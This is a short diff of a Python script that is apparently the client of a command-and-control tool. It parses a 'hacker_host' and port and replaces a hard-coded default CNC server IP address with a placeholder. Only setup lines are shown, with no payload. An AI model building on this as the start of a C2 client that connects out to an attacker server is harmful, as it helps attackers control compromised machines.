@@ -14,7 +14,7 @@ if len(sys.argv) < 2 :
     print( "Missing one argument.\nUsage: {} <hacker_host> <port - optional>\nExiting.".format(sys.argv[0]) )
     exit()
 
-serverName = sys.argv[1] if len(sys.argv) > 1 else '96.126.97.119' # Use CNC (server) ip by default
+serverName = sys.argv[1] if len(sys.argv) > 1 else '<hacker_ip>' # Use CNC (server) ip by default
 serverPort = sys.argv[2] if len(sys.argv) > 2 else 8000 # Use port 8000 by default
 
 print("SERVER: {} PORT: {}".format(serverName,serverPort) ) 
